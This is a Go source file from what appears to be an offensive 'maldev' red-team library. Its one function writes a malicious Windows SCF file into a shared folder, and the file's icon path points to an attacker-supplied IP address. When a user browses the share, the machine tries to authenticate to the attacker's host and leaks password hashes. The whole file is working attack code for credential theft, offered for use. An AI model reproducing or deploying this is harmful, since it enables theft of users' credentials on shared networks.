package redteam

/*

References:
https://1337red.wordpress.com/using-a-scf-file-to-gather-hashes/

*/

import (
	"github.com/D3Ext/maldev/files"
)

func CreateScf(filepath string, attacker_ip string) error {
	// Create a malicous SCF file on especified path (inside an smb share)
	scf_content := "[Shell]\r\nCommand=2\r\nIconFile=\\" + attacker_ip + "\\share\\test.ico\r\n[Taskbar]\r\nCommand=ToggleDesktop"

	err := files.WriteContent(filepath, scf_content) // Write content to file
	if err != nil {
		return err
	}

	return nil
}
